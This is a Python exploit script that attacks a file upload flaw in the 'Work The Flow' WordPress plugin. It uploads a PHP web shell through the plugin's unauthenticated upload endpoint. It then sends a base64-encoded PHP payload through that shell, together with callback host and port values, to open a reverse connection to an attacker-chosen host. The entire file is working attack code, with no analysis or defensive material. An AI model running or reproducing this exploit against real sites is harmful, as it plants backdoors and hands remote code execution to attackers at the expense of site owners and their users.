#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150427.1
# Licence: WTFPL - wtfpl.net
import requests
import json
import sys
__version__ = "20150427.1"

def banner():
    print """\x1b[1;32m
 ██▓███   █     █░███▄    █   █████▒██▓     ▒█████   █     █░
▓██░  ██▒▓█░ █ ░█░██ ▀█   █ ▓██   ▒▓██▒    ▒██▒  ██▒▓█░ █ ░█░
▓██░ ██▓▒▒█░ █ ░█▓██  ▀█ ██▒▒████ ░▒██░    ▒██░  ██▒▒█░ █ ░█ 
▒██▄█▓▒ ▒░█░ █ ░█▓██▒  ▐▌██▒░▓█▒  ░▒██░    ▒██   ██░░█░ █ ░█ 
▒██▒ ░  ░░░██▒██▓▒██░   ▓██░░▒█░   ░██████▒░ ████▓▒░░░██▒██▓ 
▒▓▒░ ░  ░░ ▓░▒ ▒ ░ ▒░   ▒ ▒  ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▓░▒ ▒  
░▒ ░       ▒ ░ ░ ░ ░░   ░ ▒░ ░     ░ ░ ▒  ░  ░ ▒ ▒░   ▒ ░ ░  
░░         ░   ░    ░   ░ ░  ░ ░     ░ ░   ░ ░ ░ ▒    ░   ░  
             ░            ░            ░  ░    ░ ░      ░    
Exploit for Work The Flow w/ Shell Upload. Version: %s\x1b[0m""" %(__version__)

def php_encoder(php):
    f = open(php, "r").read()
    f = f.replace("<?php", "")
    f = f.replace("?>", "")
    encoded = f.encode('base64')
    encoded = encoded.replace("\n", "")
    encoded = encoded.strip()
    code = "eval(base64_decode('%s'));" %(encoded)
    return code

def shell_upload(url):
    target_url = url + "/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php"
    try:
        print "\x1b[1;32m{+} Using target URL of: %s\x1b[0m" %(target_url)    
        data = {"action": "upload"}
        r = requests.post(url=target_url, data=data, files={"files":("pwn.php", "<?php @assert(filter_input(0,woot,516)); ?>")})
    except Exception, e:
        sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
    if r.text:
        return r.text.strip()
    else:
        sys.exit("\x1b[1;31m{-} Something fucked up... Our shell was not uploaded :/\x1b[0m")


def spawn_backconnect(shell_url, payload, cb_host, cb_port):
    cookies = {'host': cb_host, 'port': cb_port}
    data = {'woot': payload}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
    try:
        print "\x1b[1;32m{*} Sending our payload...\x1b[0m"
        r = requests.post(url=shell_url, data=data, headers=headers, verify=False, cookies=cookies)
    except Exception, e:
        sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
    if r.text:
        print r.text

def pop_shell(target, code, cb_host, cb_port):
    shell_key = shell_upload(url=target)
    shell_dict = json.loads(shell_key)
    shell_url = shell_dict['files'][0]['url']
    print "\x1b[1;32m{+} Our shell is at: %s\x1b[0m" %(shell_url)
    try:
        print "\x1b[1;36m{*} Sending Backconnect to %s:%s...\x1b[0m" %(cb_host, cb_port)
        spawn_backconnect(shell_url=shell_url, payload=code, cb_host=cb_host, cb_port=cb_port)
    except Exception, e:
        sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))

def main(args):
    banner()
    if len(args) != 5:
        sys.exit("use: %s http://host/wordpress_baseurl/ <payload.php> <cb_host> <cb_port>" %(args[0]))
    pop_shell(target=args[1], code=php_encoder(args[2]), cb_host=args[3], cb_port=args[4])

if __name__ == "__main__":
    main(args=sys.argv)

